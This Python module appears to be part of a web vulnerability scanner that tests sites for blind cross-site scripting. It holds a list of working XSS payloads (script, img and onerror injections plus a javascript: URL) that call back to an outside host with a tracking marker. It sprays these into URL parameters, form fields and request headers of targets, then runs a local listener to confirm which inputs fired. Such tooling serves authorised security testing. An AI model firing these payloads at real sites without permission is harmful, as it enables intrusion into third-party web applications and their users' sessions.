from __future__ import annotations

import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

from . import params, payloads


def vectors(callback, mk):
    cb = callback.rstrip("/") + "/" + mk
    host = cb.split("://", 1)[-1]
    return [
        '"><script src=%s></script>' % cb,
        "'><script src=%s></script>" % cb,
        '<script src=%s></script>' % cb,
        '"><img src=%s>' % cb,
        '" onerror="new Image().src=\'%s\'" x="' % cb,
        '</textarea><script src=%s></script>' % cb,
        '</title><script src=%s></script>' % cb,
        'javascript:new Image().src="//%s"' % host,
    ]


def inject(client, get_targets=None, forms=None, header_urls=None,
           callback="http://blind.invalid"):
    from .scanner import REFLECT_HEADERS, _header_probe_value
    log = []
    for url in get_targets or []:
        for name in params.injectable(url):
            mk = payloads.marker()
            for v in vectors(callback, mk):
                try:
                    client.get(params.set_param(url, name, v))
                except Exception:
                    pass
            log.append({"marker": mk, "method": "GET", "url": url, "param": name})
    for form in forms or []:
        for name in form["fields"]:
            mk = payloads.marker()
            for v in vectors(callback, mk):
                body = {f: (v if f == name else "1") for f in form["fields"]}
                try:
                    client.post(form["action"], body)
                except Exception:
                    pass
            log.append({"marker": mk, "method": "POST", "url": form["action"],
                        "param": name})
    for url in header_urls or []:
        for h in REFLECT_HEADERS:
            mk = payloads.marker()
            for v in vectors(callback, mk):
                try:
                    client.get(url, headers={h: _header_probe_value(h, v)})
                except Exception:
                    pass
            log.append({"marker": mk, "method": "HEADER", "url": url, "param": h})
    return log


def correlate(log, hits):
    fired = {h.get("marker") for h in (hits or [])}
    return [e for e in log if e["marker"] in fired]


class _Collector(BaseHTTPRequestHandler):
    hits = []

    def _record(self):
        mk = self.path.strip("/").split("/")[0].split("?")[0]
        try:
            self.hits.append({"marker": mk, "path": self.path})
        except Exception:
            pass
        try:
            self.send_response(200)
            self.send_header("Content-Length", "0")
            self.end_headers()
        except Exception:
            pass

    do_GET = _record
    do_POST = _record

    def log_message(self, *a):
        pass


def start_listener(spec):
    host, _, port = (spec or "").rpartition(":")
    host = host or "127.0.0.1"
    port = int(port or "0")
    hits = []
    handler = type("XparsCollector", (_Collector,), {"hits": hits})
    srv = HTTPServer((host, port), handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, hits


def run(client, callback=None, get_targets=None, forms=None, header_urls=None,
        listen=None, wait=0.0):
    srv = None
    hits = []
    if listen:
        srv, hits = start_listener(listen)
        if not callback:
            callback = "http://%s:%d" % (srv.server_address[0], srv.server_address[1])
    log = inject(client, get_targets, forms, header_urls, callback or "http://blind.invalid")
    if wait and srv is not None:
        import time
        time.sleep(wait)
    confirmed = correlate(log, hits)
    if srv is not None:
        try:
            srv.shutdown()
        except Exception:
            pass
    return {"callback": callback, "log": log, "hits": list(hits), "confirmed": confirmed}
